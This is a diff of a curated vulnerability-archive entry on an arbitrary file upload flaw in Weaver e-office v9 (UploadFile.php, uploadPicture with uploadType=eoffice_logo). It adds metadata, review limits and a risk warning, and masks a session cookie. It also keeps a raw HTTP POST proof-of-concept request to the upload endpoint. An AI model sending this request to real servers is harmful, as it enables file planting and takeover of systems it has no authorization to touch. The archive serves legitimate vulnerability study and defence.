@@ -1,10 +1,49 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "泛微e-office9 UploadFile.php uploadPicture logo上传"
+product: "泛微e-office9"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "v9.0；uploadType=eoffice_logo特例"
+prerequisites: "样本含会话，未说明登录要求"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/uAhcQ8O1HKHZ6JLZ_pmNzg"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%EF%BC%9A%E6%9F%90%20E-Office%20v9%20%E8%A2%AB%E6%8D%95%E8%8E%B7%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md"
+id: "vw-b466dee07b3b236d57ffc03e"
+entity_id: "ve-b466dee07b3b236d57ffc03e"
+schema_version: "1"
 ---
 
-# 漏洞预警：某 E-Office v9 被捕获的任意文件上传漏洞分析
+# 泛微e-office9 UploadFile.php uploadPicture logo上传
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：泛微e-office9；UploadFile.php uploadPicture logo上传
+- 版本、配置及部署条件：v9.0；uploadType=eoffice_logo特例
+- 认证与权限前提：样本含会话，未说明登录要求
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 同CNVD49104接口/落点，新增uploadType分支根因解释，值得合并保留
+- 源码仅截图；multipart字段丢失影响复现，应借完整专项恢复
+- 标题被捕获仅指原公告，不应直接作为在野证据；广告图片占比高
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uAhcQ8O1HKHZ6JLZ_pmNzg)
 
 ![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)
@@ -69,7 +108,7 @@ https://mp.weixin.qq.com/s/P75K_0869h-nWHRMu06zgQ
 
 构造请求上传文件即可
 
-```
+```http
 POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
 Host: 127.0.0.1:7899
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
@@ -77,8 +116,7 @@ Accept-Encoding: gzip, deflate
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Connection: close
 Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
-Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
-Content-Length: 193
+Cookie: LOGIN_LANG=cn; PHPSESSID=0******************************8
 Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
 
 --e64bdf16c554bbc109cecef6451c26a4
@@ -89,6 +127,8 @@ Content-Type: image/jpeg
 
 --e64bdf16c554bbc109cecef6451c26a4--
 ```
+
+> 请求长度说明：原资料 Content-Length 为 193；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4YJdsaYQxt8Y3SCzgBNk7MAXYCsbxD8JjNibBmIv4nLYtwOg6A6oQk7l1PHH6SmHyn3NL7jQTCuMQ/640?wx_fmt=png)
 
